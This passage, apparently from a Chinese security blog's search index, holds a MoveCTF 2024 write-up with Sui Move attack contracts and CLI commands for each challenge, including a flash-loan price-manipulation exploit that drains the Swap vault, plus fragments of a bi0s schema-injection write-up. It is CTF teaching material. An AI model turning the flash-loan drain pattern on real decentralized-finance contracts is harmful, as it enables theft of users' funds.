protobuf.parse(schema).root; Note = root.lookupType(\u0026#39;Note\u0026#39;); [...] 在/customise可以修改settings.proto文件。\napp.post(\u0026#39;/customise\u0026#39;,(req, res) =\u0026gt; { try { const { data } = req.body; let author = data.pop()[\u0026#39;author\u0026#39;]; let title = data.pop()[\u0026#39;title\u0026#39;]; let protoContents = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;).split(\u0026#39;\\n\u0026#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=\u0026#34;user\u0026#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=\u0026#34;user\u0026#34;];`; } fs.","title":"bi0s CTF 2024 wp"},{"content":"Checkin sorce:100\n题目源码:\nmodule movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector\u0026lt;u8\u0026gt;, ctx: \u0026amp;mut TxContext) { assert!(string == b\u0026#34;MoveBitCTF\u0026#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } 带着MoveBitCTF字符串作为参数调用get_flag函数。传参要用字节。\n# 转换为十六进制 print(\u0026#34;0x\u0026#34;) for i in \u0026#34;MoveBitCTF\u0026#34;: print(hex(ord(i)).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;),end=\u0026#34;\u0026#34;) 调用即可：\nsui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200\n关键代码\npublic entry fun execute(record: \u0026amp;mut Record, m: u64, n: u64) { if (record.count_1 == 0) { let result: u64 = up(m, n); assert!(result == TARGET_VALUE_1, ERROR_RESULT_1); record.count_1 = m; record.count_2 = n; } else if (record.count_3 == 0) { let result: u64 = up(m, n); assert!(result == TARGET_VALUE_2, ERROR_RESULT_2); record.count_3 = m; record.count_4 = n; } } public entry fun get_flag(record: \u0026amp;Record, ctx: \u0026amp;mut TxContext) { assert!(record.count_1 \u0026lt; record.count_3, ERROR_PARAM_1); assert!(record.count_2 \u0026gt; record.count_4, ERROR_PARAM_2); event::emit(Flag { user: tx_context::sender(ctx), flag: true }); } 得到flag的条件是count_1 \u0026lt; count_3且count_2 \u0026gt; count_4。\nup函数使用动态规划根据输入参数m和n计算一个值。它使用一个向量的向量构建一个值的矩阵，并从矩阵的最后一行的最后一个元素中检索所需的值。\n让ai将up函数用python重写然后本地跑一下的到两组数据，3-169和5-89。 通过execute函数去赋值（数字m和n传递时要转换成十六进制）。然后调用get_flag即可。\nSwap sorce: 200\n题目源码：\nmodule swap::vault{ use sui::coin::{Self, Coin}; use sui::tx_context::{Self, TxContext}; use sui::balance::{Self, Balance}; use sui::object::{Self, ID, UID}; use sui::transfer; use sui::event; use swap::ctfa::{Self, MintA}; use swap::ctfb::{Self, MintB}; struct Vault\u0026lt;phantom A, phantom B\u0026gt; has key { id: UID, coin_a: Balance\u0026lt;A\u0026gt;, coin_b: Balance\u0026lt;B\u0026gt;, flashed: bool } struct Flag has copy, drop { win: bool, sender: address } struct Receipt { id: ID, a_to_b: bool, repay_amount: u64 } public entry fun initialize\u0026lt;A,B\u0026gt;(capa: MintA\u0026lt;A\u0026gt;, capb: MintB\u0026lt;B\u0026gt;,ctx: \u0026amp;mut TxContext) { let vault = Vault\u0026lt;A, B\u0026gt; { id: object::new(ctx), coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)), coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)), flashed: false }; transfer::share_object(vault); } public fun flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, amount: u64, a_to_b: bool, ctx: \u0026amp;mut TxContext): (Coin\u0026lt;A\u0026gt;, Coin\u0026lt;B\u0026gt;, Receipt) { assert!(!vault.flashed, 1); let (coin_a, coin_b) = if (a_to_b) { (coin::zero\u0026lt;A\u0026gt;(ctx), coin::from_balance(balance::split(\u0026amp;mut vault.coin_b, amount ), ctx)) } else { (coin::from_balance(balance::split(\u0026amp;mut vault.coin_a, amount ), ctx), coin::zero\u0026lt;B\u0026gt;(ctx)) }; let receipt = Receipt { id: object::id(vault), a_to_b, repay_amount: amount }; vault.flashed = true; (coin_a, coin_b, receipt) } public fun repay_flash\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina: Coin\u0026lt;A\u0026gt;, coinb: Coin\u0026lt;B\u0026gt;, receipt: Receipt) { let Receipt { id: _, a_to_b: a2b, repay_amount: amount } = receipt; if (a2b) { assert!(coin::value(\u0026amp;coinb) \u0026gt;= amount, 0); } else { assert!(coin::value(\u0026amp;coina) \u0026gt;= amount, 1); }; balance::join(\u0026amp;mut vault.coin_a, coin::into_balance(coina)); balance::join(\u0026amp;mut vault.coin_b, coin::into_balance(coinb)); vault.flashed = false; } public fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } public fun swap_b_to_a\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coinb:Coin\u0026lt;B\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;A\u0026gt; { let amount_out_A = coin::value(\u0026amp;coinb) * balance::value(\u0026amp;vault.coin_a) / balance::value(\u0026amp;vault.coin_b); coin::put\u0026lt;B\u0026gt;(\u0026amp;mut vault.coin_b, coinb); coin::take(\u0026amp;mut vault.coin_a, amount_out_A, ctx) } public fun get_flag\u0026lt;A,B\u0026gt;(vault: \u0026amp;Vault\u0026lt;A,B\u0026gt;, ctx: \u0026amp;TxContext) { assert!( balance::value(\u0026amp;vault.coin_a) == 0 \u0026amp;\u0026amp; balance::value(\u0026amp;vault.coin_b) == 0, 123 ); event::emit( Flag { win: true, sender: tx_context::sender(ctx) } ); } } ctfa和ctfb中定义了两种货币，不是重点，就不放源码了。\n提供了闪电贷和两种货币相互兑换的功能。\n介绍一下闪电贷 源码中Receipt作为欠条，在用户贷款时发送给用户，由于其没有drop能力，所以交易结束之前如果没有被解包就会报错导致交易失败。 repay_flash函数可以解包receipt。这就意味着贷款的借出和归还只能在一笔交易中进行，就是让你借出去拿这些钱去套利，然后马上还回来，如果不换或者换的不够交易就失败，这笔交易就不会写入链上。\n题解 由于定义了vault.flashed变量，所以我们只能一次借一种货币且在未还清之前不能再借，所以我们要先将vault中某一种货币清空，再把另一种货币借空，然后调用get_flag，然后再还钱就可以了。\nswap_a_to_b和swap_b_to_a可以将两种货币相互兑换，兑换时按照比例进行兑换，但问题在于，兑换的比率没有考虑贷款。以swap_a_to_b为例：\npublic fun swap_a_to_b\u0026lt;A,B\u0026gt;(vault: \u0026amp;mut Vault\u0026lt;A,B\u0026gt;, coina:Coin\u0026lt;A\u0026gt;, ctx: \u0026amp;mut TxContext): Coin\u0026lt;B\u0026gt; { // 传参vault为银行，coina为我们的A货币 let amount_out_B = coin::value(\u0026amp;coina) * balance::value(\u0026amp;vault.coin_b) / balance::value(\u0026amp;vault.coin_a); // 计算出可以兑换的B的数量，这里只考虑了vault内的余量，没有加上我们已经贷出去的。 coin::put\u0026lt;A\u0026gt;(\u0026amp;mut vault.coin_a, coina); coin::take(\u0026amp;mut vault.coin_b, amount_out_B, ctx) } vault中初始有A,B各100个，攻击者初始拥有A,B各10个。\n我先借90个A 在用10个A去换B，此时vault中 B/A = 10 ,所以10个A可以还100个B。 在把90个A还回去。 通过这三步操作，我们手上拥有110个B（10个本来拥有+vault中的100个）和0个A（10A换成了B）。而且此时所有的欠款均已还清。 最后在把vault中的110个A借出来就可以了。 攻击合约: module zoiltin_solve_swap::exp{ use sui::coin::{Self,Coin}; use sui::tx_context::{Self,TxContext}; use sui::transfer; use sui::balance::{Self}; use swap::vault::{Self,Receipt}; public entry fun exp\u0026lt;A,B\u0026gt;(bank: \u0026amp;mut vault::Vault\u0026lt;A,B\u0026gt;,my_coin_a: Coin\u0026lt;A\u0026gt;,ctx: \u0026amp;mut TxContext){ // 传参带进来vault和我们初始的10个A let (coin_a_1,coin_b_1,receipt_1) = vault::flash\u0026lt;A,B\u0026gt;(bank,90,false,ctx); // 借90个A let coin_b_swap = vault::swap_a_to_b\u0026lt;A,B\u0026gt;(bank,my_coin_a,ctx); // 10A个换成B assert!(coin::value(\u0026amp;coin_b_swap) == 100, 12); // 换出来的B的数量是否等于100 transfer::public_transfer(coin_b_swap,tx_context::sender(ctx)); // 将100个B传递到我们的地址上 vault::repay_flash\u0026lt;A,B\u0026gt;(bank,coin_a_1,coin_b_1,receipt_1); // 还债90个A let (coin_a_2,coin_b_2,receipt_2) = vault::flash\u0026lt;A,B\u0026gt;(bank,110,false,ctx); // 再借110个A assert!(coin::value(\u0026amp;coin_a_2) == 110, 11); // 第二次借出来A的数量是否等于110 vault::get_flag\u0026lt;A,B\u0026gt;(bank,ctx); // 拿flag vault::repay_flash\u0026lt;A,B\u0026gt;(bank,coin_a_2,coin_b_2,receipt_2); // 还钱110A } } 部署攻击合约 这部分也该提一下，网上的资料基本都是英文的。\n#首先创建一个新的包 sui move new zoiltin_solve_swap #文件结构如下： #zoiltin_solve_swap/ #| /sources/ #| | exp.move #| /Move.toml Move.toml内容如下：\n[package] name = \u0026#34;zoiltin_solve_swap\u0026#34; version = \u0026#34;0.0.1\u0026#34; [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } # Sui = { local = \u0026#34;/opt/sui/crates/sui-framework/packages/sui-framework\u0026#34; } swap = { local = \u0026#34;../swap\u0026#34; } [addresses] zoiltin_solve_swap = \u0026#34;0x0\u0026#34; swap = \u0026#34;package_id\u0026#34; sui = \u0026#34;0x2\u0026#34; addresses里面：0x0代表此包尚未发布，意思就是这次要发布的包。如果已经发布了就像题目中的swap包就写这个包的package_id以及在published-at里写上package_id\ndependencies放源代码路径。\nswap源码里的Move.toml文件也要改：\n[package] name = \u0026#34;swap\u0026#34; version = \u0026#34;0.0.1\u0026#34; published-at = \u0026#34;package_id\u0026#34; [dependencies] Sui = { git = \u0026#34;https://github.com/MystenLabs/sui.git\u0026#34;, subdir = \u0026#34;crates/sui-framework/packages/sui-framework\u0026#34;, rev = \u0026#34;framework/testnet\u0026#34; } # Sui = { local = \u0026#34;/opt/sui/crates/sui-framework/packages/sui-framework\u0026#34; } [addresses] swap = \u0026#34;package_id\u0026#34; 在攻击合约目录下执行以下代码来发布包\nsui client publish --with-unpublished-dependencies --skip-dependency-verification --gas-budget 1000000000 可以查看CTFA和CTFB两个泛型的地址。 CTFA和CTFB为题目定义的两种币，\u0026ndash;type-args要传入CTFA和CTFB作为泛型。\n先调用vault里的initiate函数来初始化A,B个10个币。\n然后调用攻击合约中的exp函数.sui client call --package \u0026lt;攻击合约的package_id\u0026gt; --module exp --function exp --type-args \u0026lt;\u0026lt;CTFA的详细地址\u0026gt;,\u0026lt;CTFB的详细地址\u0026gt;\u0026gt; --args \u0026lt;那两个参数\u0026gt; --gas-budget 10000000\nEasyGame 源码：\npublic fun submit_solution(user_input: vector\u0026lt;u64\u0026gt;,rc: \u0026amp;mut Challenge,ctx: \u0026amp;mut TxContext ){ let sender = sui::tx_context::sender(ctx); let houses = rc.initial_part; vector::append(\u0026amp;mut houses, user_input); let amount_robbed = rob(\u0026amp;houses); let result = amount_robbed == rc.target_amount; if (result) { event::emit(Flag { user: sender, flag: true }); }; } public fun rob(houses: \u0026amp;vector\u0026lt;u64\u0026gt;):u64{ let n = vector::length(houses); if (n ==0){ 0; }; let v = vector::empty\u0026lt;u64\u0026gt;(); vector::push_back(\u0026amp;mut v, *vector::borrow(houses, 0)); if (n\u0026gt;1){ vector::push_back(\u0026amp;mut v, math::max(*vector::borrow(houses, 0), *vector::borrow(houses, 1))); }; let i = 2; while (i \u0026lt; n) { let dp_i_1 = *vector::borrow(\u0026amp;v, i - 1); let dp_i_2_plus_house = *vector::borrow(\u0026amp;v, i - 2) + *vector::borrow(houses, i); vector::push_back(\u0026amp;mut v, math::max(dp_i_1, dp_i_2_plus_house)); i = i + 1; } ; *vector::borrow(\u0026amp;v, n - 1) } house初始值为[1,2,4,5,1,3,6,7]，需要我们在house后追加一些数据是rob函数返回22。 rob函数是用动态规划计算在不抢劫相邻房屋的情况下如何利益最大，发现添加一个数字9就可以。\n攻击合约 module zoiltin_solve_easy_game::exp{ use std::vector; use sui::tx_context::TxContext; use easygame::easy_game::{Self,Challenge}; public entry fun exp(rc: \u0026amp;mut Challenge,ctx: \u0026amp;mut TxContext){ let payload = vector::empty\u0026lt;u64\u0026gt;(); vector::push_back(\u0026amp;mut payload,9); easy_game::submit_solution(payload,rc,ctx); } } Kitchen sorce: 200\n题目关键源码：\npublic fun cook(olive_oils: vector\u0026lt;Olive_oil\u0026gt;, yeast: vector\u0026lt;Yeast\u0026gt;, flour: vector\u0026lt;Flour\u0026gt;, salt: vector\u0026lt;Salt\u0026gt;, status: \u0026amp;mut Status) { let l1 = vector::length\u0026lt;Olive_oil\u0026gt;(\u0026amp;olive_oils); let l2 = vector::length\u0026lt;Yeast\u0026gt;(\u0026amp;yeast); let l3 = vector::length\u0026lt;Flour\u0026gt;(\u0026amp;flour); let l4 = vector::length\u0026lt;Salt\u0026gt;(\u0026amp;salt); let cook1 = Cook {source : vector::empty\u0026lt;Olive_oil\u0026gt;()}; let cook2 = Cook {source : vector::empty\u0026lt;Yeast\u0026gt;()}; let cook3 = Cook {source : vector::empty\u0026lt;Flour\u0026gt;()}; let cook4 = Cook {source : vector::empty\u0026lt;Salt\u0026gt;()}; let i = 0; while(i \u0026lt; l1) { vector::push_back(\u0026amp;mut cook1.source, *vector::borrow(\u0026amp;olive_oils, i)); i = i + 1; }; i = 0; while(i \u0026lt; l2) { vector::push_back(\u0026amp;mut cook2.source, *vector::borrow(\u0026amp;yeast, i)); i = i + 1; }; i = 0; while(i \u0026lt; l3) { vector::push_back(\u0026amp;mut cook3.source, *vector::borrow(\u0026amp;flour, i)); i = i + 1; }; i = 0; while(i \u0026lt; l4) { vector::push_back(\u0026amp;mut cook4.source, *vector::borrow(\u0026amp;salt, i)); i = i + 1; }; let p = Pizza { olive_oils: cook1, yeast: cook2, flour: cook3, salt: cook4, }; assert!( bcs::to_bytes(\u0026amp;p) == x\u0026#34;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026#34;, 0); status.status1 = true; } public fun recook (out: vector\u0026lt;u8\u0026gt;, status: \u0026amp;mut Status) { let p = Pizza { olive_oils: Cook\u0026lt;Olive_oil\u0026gt; { source: vector\u0026lt;Olive_oil\u0026gt;[ get_Olive_oil(0xb9d9), get_Olive_oil(0xeb54), get_Olive_oil(0x9268), get_Olive_oil(0xc5f7), get_Olive_oil(0xa1ec), get_Olive_oil(0xd084), ] }, yeast: Cook\u0026lt;Yeast\u0026gt; { source: vector\u0026lt;Yeast\u0026gt;[ get_Yeast(0xbd00), get_Yeast(0xfc81), get_Yeast(0x999d), get_Yeast(0xb77e), ] }, flour: Cook\u0026lt;Flour\u0026gt; { source: vector\u0026lt;Flour\u0026gt;[ get_Flour(0xdcc7), get_Flour(0xcc7a), get_Flour(0x8f19), get_Flour(0x96b1), get_Flour(0x8a6d), ] }, salt: Cook\u0026lt;Salt\u0026gt; { source: vector\u0026lt;Salt\u0026gt;[ get_Salt(0x8b01), get_Salt(0xf1c5), get_Salt(0xc6ec), ] }, }; assert!( bcs::to_bytes(\u0026amp;p) == out, 0); status.status2 = true; } 需要让这两个函数返回true。涉及到序列化。\n先看cook函数 cook函数要我们传入一个配方对象，然后比较序列化后是否与x\u0026quot;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026quot;相等。\nBinary Canonical Serialization, BCS, 是在 Diem 区块链项目中开发出来的序列化格式，现在也被广泛应用于大部分基于 Move 的区块链，比如Sui, Starcoin, Aptos, 0L. 除了在 Move VM 虚拟机中使用，BCS也被用在交易 transaction 和事件 event 编码中，比如在签署交易之前做序列化处理，解析事件数据。 相关资料：https://intro-zh.sui-book.com/advanced-topics/BCS_encoding/lessons/BCS_%E7%BC%96%E7%A0%81.html\n查阅资料得知：\nBCS是一种数据序列化格式，其生成的输出字节不包含任何类型信息。因此，接收编码字节的一方需要知道如何反序列化数据\nBCS 中没有数据类型，当然也没有结构体 structs; struct 只是定义了内部字段 fields 被序列化的顺序\n感觉这个c语言中的序列化比较相似，c语言中的将结构体从内存中写入二进制文件时就是直接原封不动把内存写入文件。而数据格式全靠程序员自定义。\n看下面这个例子便于理解：\nstruct Metadata has drop, copy { name: std::ascii::String } struct BCSObject has drop, copy { id: ID, owner: address, meta: Metadata } let (id, owner, meta) = ( bcs::peel_address(\u0026amp;mut bcs), bcs::peel_address(\u0026amp;mut bcs), bcs::peel_vec_u8(\u0026amp;mut bcs) ); 反序列化meta时使用的格式是vector\u0026lt;u8\u0026gt;（8位整数数组，就是std::ascii::String的格式），也就是说序列化时直接忽略了Metadata结构体，直接把对象从内存中转储成字节。\n然后再看题目中的结构，以Olive_oil为例，其他四种食材都一样：\nstruct Olive_oil has copy, drop, store {amount: u16} struct Pizza has copy, drop, store { olive_oils: Cook\u0026lt;Olive_oil\u0026gt;, yeast: Cook\u0026lt;Yeast\u0026gt;, flour: Cook\u0026lt;Flour\u0026gt;, salt: Cook\u0026lt;Salt\u0026gt;, } struct Cook\u0026lt;T\u0026gt; has copy, drop, store { source: vector\u0026lt;T\u0026gt; } Pizza中的olive_oils实际上是一个16位整数的数组，外面套了两层结构体。由于bcs的序列化格式，Pizza的序列化数据为：\n数组长度 数据 数组长度 数据 \u0026hellip;. 0x4 0x1 0x2 0x3 0x4 0x3 0x1 0x2 0x3 \u0026hellip;. 使用以下python脚本解析：\ndata = \u0026#39;0415a5b8a6f8c946bb0300bd9d997eb7038ad784faf2b802c5f122e1\u0026#39; i = 0 bytes_s = [] while i \u0026lt; len(data) - 1: bytes_s.append(int(\u0026#39;0x\u0026#39; + data[i] + data[i+1],16)) i = i+ 2 res = [] i = 0 p = 0 while i \u0026lt; len(bytes_s): p = bytes_s[i] i = i + 1 l = [] for o in range(p): l.append(\u0026#39;0x\u0026#39; + hex(bytes_s[i+1]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;) + hex(bytes_s[i]).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;)) i = i + 2 res.append(l) print(res) 可能是因为反码补码那一套东西，我发现2字节的数字（16位）需要倒换一下才行。 通过得到的数据生成对象即可。\nrecook函数： recook函数就简单许多了。 已经把数据都写出来了，直接生成序列化数据传参即可。\n攻击合约 module zoiltin_solve_kitchen::exp{ use sui::tx_context::{TxContext}; use sui::bcs; use sui::event; use std::vector; use kitchen::kitchen::{Self,Olive_oil,Yeast,Flour,Salt}; struct Poil has drop{ p1:vector\u0026lt;u16\u0026gt;, p2:vector\u0026lt;u16\u0026gt;, p3:vector\u0026lt;u16\u0026gt;, p4:vector\u0026lt;u16\u0026gt; } struct Message has drop,copy{ mass:vector\u0026lt;u8\u0026gt; } public entry fun exp(ctx: \u0026amp;mut TxContext) { let obj1 = Poil{ p1:vector\u0026lt;u16\u0026gt;[0xa515,0xa6b8,0xc9f8,0xbb46], p2:vector\u0026lt;u16\u0026gt;[0xbd00,0x999d,0xb77e], p3:vector\u0026lt;u16\u0026gt;[0xd78a,0xfa84,0xb8f2], p4:vector\u0026lt;u16\u0026gt;[0xf1c5,0xe122] }; // cook需要的相应数据。 let statu = kitchen::get_status(ctx); let l1 = 4; let l2 = 3; let l3 = 3; let l4 = 2; let cook1 = vector::empty\u0026lt;Olive_oil\u0026gt;(); let cook2 = vector::empty\u0026lt;Yeast\u0026gt;(); let cook3 = vector::empty\u0026lt;Flour\u0026gt;(); let cook4 = vector::empty\u0026lt;Salt\u0026gt;(); // 通过数据生成所需的对象。 let i = 0; while(i \u0026lt; l1) { vector::push_back(\u0026amp;mut cook1, kitchen::get_Olive_oil((*vector::borrow(\u0026amp;obj1.p1, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l2) { vector::push_back(\u0026amp;mut cook2, kitchen::get_Yeast((*vector::borrow(\u0026amp;obj1.p2, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l3) { vector::push_back(\u0026amp;mut cook3, kitchen::get_Flour((*vector::borrow(\u0026amp;obj1.p3, i) as u16))); i = i + 1; }; i = 0; while(i \u0026lt; l4) { vector::push_back(\u0026amp;mut cook4, kitchen::get_Salt((*vector::borrow(\u0026amp;obj1.p4, i) as u16))); i = i + 1; }; // event::emit( Message{ // mass: bcs::to_bytes(\u0026amp;obj1) // } ); // assert!( bcs::to_bytes(\u0026amp;obj1) == x\u0026#34;04a515a6b8c9f8bb4603bd00999db77e03d78afa84b8f202f1c5e122\u0026#34;, 999); kitchen::cook(cook1,cook2,cook3,cook4,\u0026amp;mut statu); let obj2 = Poil{ p1:vector\u0026lt;u16\u0026gt;[ 0xb9d9, 0xeb54, 0x9268, 0xc5f7, 0xa1ec, 0xd084 ], p2:vector\u0026lt;u16\u0026gt;[ 0xbd00, 0xfc81, 0x999d, 0xb77e ], p3:vector\u0026lt;u16\u0026gt;[ 0xdcc7, 0xcc7a, 0x8f19, 0x96b1, 0x8a6d ], p4:vector\u0026lt;u16\u0026gt;[ 0x8b01, 0xf1c5, 0xc6ec ] }; // 这里通过自定义的Poil结构生成序列化字节，因为bcs特点，只要他们在内存中存储格式一样，无论结构体名或嵌套了几层都无所谓。最后生成的序列化字节都是一样的。 kitchen::recook(bcs::to_bytes(\u0026amp;obj2),\u0026amp;mut statu); kitchen::get_flag(\u0026amp;statu,ctx); } } 网上关于bcs的资料很少，搜到的bcs的第三方解析库也都不能成功解析，不过还好题目的数据不算复杂，自己写的脚本也能用。\nsubset sorce: 400 (未解决)\n题目源码：\nmodule subset::subset_sum { use sui::event; use sui::tx_context; use std::vector; struct Flag has copy, drop { user: address } struct Status has store, drop { status1: bool, status2: bool, status3: bool, user: address } const SUBSET1: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[1, 2, 3, 4, 5]; const SUBSET1_k: u256 = 3; const SUBSET1_SUM: u256 = 10; const SUBSET2: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[657114161599166, 910496114410022, 688072175280628, 979125688929861, 785338725553848, 887159728265050, 622841641193103, 725154659875148, 740423950361799, 1112663190822550, 922195312967936, 1042436852643560, 794233930466363, 1005209504277475, 1095553790921575, 1100234031975913, 1097338706315892, 685173186787942, 931084447948631, 1025208692464347, 823246835986875, 640705587553065, 1067772094848338, 608307547370178, 860527574463312, 745522896700102, 1107646656429468, 575719789023353, 1008988042757401, 563072788255737, 882855688862943, 974319745991702, 1004427379286462, 904504413493231, 1083652042079152, 1053694822809090, 702717128907262, 881540236795119, 992204188883575, 890965906483327]; const SUBSET2_k: u256 = 5; const SUBSET2_SUM: u256 = 4178919802453692; const SUBSET3: vector\u0026lt;u256\u0026gt; = vector\u0026lt;u256\u0026gt;[730983191275949878802706287425, 738747747182330870358722868390, 680758618870742741205069880873, 736839950200009681117675478653, 821817898783913524938769447793, 1062662929594640521216588473346, 804078432654564652353003934418, 987354119502628442223858924307, 974121064863569224403070119631, 766517359152261667697388282513, 1115664590742545309936719501477, 1254953696369781959586392455121, 708965201854329468418120106125, 803407590419087414384275360152, 680994772249007776444211943134, 1209641410992728376967530103489, 1022807828605992586908433214193, 708760513774702586605766399361, 1146510154260900723919247238072, 1071639493717448858831225830703, 704595551001390485227577881300, 666267842956106233584633761922, 916484600070887410197321230180, 869547011380359879465486127051, 1146284238922586539801525899580, 960791406315307372223215677265, 846714517434965788941098273736, 943109174072029103168835446476, 1186748483275224241752870865835, 810729587696497173434925395865, 1081140748486010470135469081647, 1117896979087650487375387404086, 815335940196924955981808193550, 980088874723074134145795909695, 1040350471929604504671667297293, 694306413856033832104987821225, 1100701148915109260220219397362, 861206885233154419043148976517, 876554683816312162465230697586, 1076923686440478606439365136720, 1107602068170190810465822909560, 1100902219684950305811682891430, 1009332208289062882998661101012, 967609782575367058780528699819, 847083579140405861838133952519, 960959937086001625649028920079, 705904760596273528708773247739, 988488072940508411593301577206, 855813607361058850034718734435, 923433147009426548286155351544, 927267999331166226154541562801, 833421857490492247367663980146, 913726313126985248790906682414, 1152739002690744639089937932044, 758241923243582267541395815418, 826183630101084916296521382931, 871183653161711616458012031543, 1118876419859306653014740242503, 925209067093127804911661688602, 796047972746266882548343051358, 1105317347573296959936900839504, 1032520332923337088078820581073, 790503191621237284611596729403, 1093888060891270134787133219999, 1129244151204837429536515955111, 736340764546413369555890340882, 844331877762673816004189096610, 1216403448409604941009786692773, 1026707098397380044704009977063, 1162146257113640418035057534747, 1239108677717284719224289951413, 1179642728157883101738427519029, 1121726694197132350252978011382, 1166236995314127503915531123371, 1237380820841327126465021125310, 928563984604088646801945637827, 969172329973162874760566309613, 916791337778690807774047076043, 1187392146940862931565053344747, 1041354841046252194695344517944]; const SUBSET3_k: u256 = 10; const SUBSET3_SUM: u256 = 9639405868465735216305592265916; public fun get_status(ctx: \u0026amp;mut tx_context::TxContext): Status { Status { status1: false, status2: false, status3: false, user: tx_context::sender(ctx) } } public fun check_params(vec: vector\u0026lt;u256\u0026gt;, k: u256) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;vec)) { assert!(*vector::borrow(\u0026amp;vec, i) == 1 || *vector::borrow(\u0026amp;vec, i) == 0, 0); sum = sum + *vector::borrow(\u0026amp;vec, i); i = i + 1; }; assert!(sum == k, 0); } public fun solve_subset1(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET1)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET1, i)); i = i + 1; }; assert!(SUBSET1_SUM == sum, 0); check_params(vec, SUBSET1_k); status.status1 = true; } public fun solve_subset2(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET2)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET2, i)); i = i + 1; }; assert!(SUBSET2_SUM == sum, 0); check_params(vec, SUBSET2_k); status.status2 = true; } public fun solve_subset3(vec: vector\u0026lt;u256\u0026gt;, status: \u0026amp;mut Status) { let i = 0; let sum: u256 = 0; while(i \u0026lt; vector::length(\u0026amp;SUBSET3)) { sum = sum + (*vector::borrow(\u0026amp;vec, i) * *vector::borrow(\u0026amp;SUBSET3, i)); i = i + 1; }; assert!(SUBSET3_SUM == sum, 0); check_params(vec, SUBSET3_k); status.status3 = true; } public fun get_flag(status: \u0026amp;Status, ctx: \u0026amp;mut tx_context::TxContext) { let user = tx_context::sender(ctx); assert!(status.user == user, 0); assert!(status.status1 \u0026amp;\u0026amp; status.status2 \u0026amp;\u0026amp; status.status3, 0); event::emit(Flag { user: user }); } } 从subset中找到一个长度为subset_k的子集，其元素之和等于subset_sum。 有三个子问题：solve_subset1，solve_subset2和solve_subset3。 请教re大佬后拿到的脚本：\ndef find_subset_sum(subset, subset_k, subset_sum): # 导入必要的库 from itertools import combinations # 遍历subset中所有可能的k元组合 for combination in combinations(subset, subset_k): # 如果组合的元素之和等于subset_sum，则返回组合 if sum(combination) == subset_sum: return combination # 如果找不到满足条件的组合，则返回None return None # 定义输入 subset = [1,2,3,4,5] subset_k = 3 subset_sum = 10 # 调用函数查找满足条件的组合 result = find_subset_sum(subset, subset_k, subset_sum) # 打印结果 if result: print(\u0026#34;找到满足条件的组合:\u0026#34;) print(result) else: print(\u0026#34;找不到满足条件的组合\u0026#34;) 第一组：(1, 4, 5) 第二组：(725154659875148, 685173186787942, 1025208692464347, 860527574463312, 882855688862943) 第三组跑不出来啦~~~~~~~~~~~\n参考 https://intro-zh.sui-book.com/ https://docs.sui.io/concepts/sui-move-concepts\n","permalink":"https://zoiltin.github.io/posts/movectf-2024-wp/","summary":"Checkin sorce:100\n题目源码:\nmodule movectf::checkin { use sui::event; use sui::tx_context::{Self, TxContext}; const ESTRING:u64 = 0; struct Flag has copy, drop { sender: address, flag: bool, } public entry fun get_flag(string: vector\u0026lt;u8\u0026gt;, ctx: \u0026amp;mut TxContext) { assert!(string == b\u0026#34;MoveBitCTF\u0026#34;,ESTRING); event::emit(Flag { sender: tx_context::sender(ctx), flag: true, }); } } 带着MoveBitCTF字符串作为参数调用get_flag函数。传参要用字节。\n# 转换为十六进制 print(\u0026#34;0x\u0026#34;) for i in \u0026#34;MoveBitCTF\u0026#34;: print(hex(ord(i)).replace(\u0026#34;0x\u0026#34;,\u0026#34;\u0026#34;),end=\u0026#34;\u0026#34;) 调用即可：\nsui client call --package package_id --module module_name --function get_flag --args 0x4d6f7665426974435446 --gas-budget 10000000 DynamicMatrixTraversal sorce: 200","title":"movectf_2024_wp"},{"content":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n关于盲XXE的文件读取 